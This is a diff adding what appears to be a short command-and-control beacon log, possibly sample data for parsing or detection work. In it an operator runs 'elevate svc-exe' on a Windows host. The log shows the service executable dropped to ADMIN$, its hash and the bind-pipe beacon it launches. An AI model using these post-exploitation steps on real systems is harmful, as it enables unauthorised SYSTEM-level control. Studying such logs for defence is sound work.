@@ -1,0 +1,10 @@
+12/19 12:44:43 UTC [metadata] beacon_1476672028 -> 192.168.1.20; computer: ACER; user: david; process: rundll32.exe; pid: 10364; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/19 12:44:35 UTC [output]
+established link to parent beacon: 192.168.1.20
+
+12/19 12:45:29 UTC [input] <neo> elevate svc-exe ec2 - smb
+12/19 12:45:29 UTC [task] <T1035, T1050> Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_9f) via Service Control Manager (\\127.0.0.1\ADMIN$\8f718bb.exe)
+12/19 12:45:29 UTC [indicator] service: \\. 8f718bb
+12/19 12:45:29 UTC [indicator] file: 4b99f0bc3296fed74e3ae431ce18b194 289280 bytes \\127.0.0.1\ADMIN$\8f718bb.exe
+12/19 12:47:12 UTC [input] <neo> exit
+12/19 12:47:12 UTC [task] <> Tasked beacon to exit
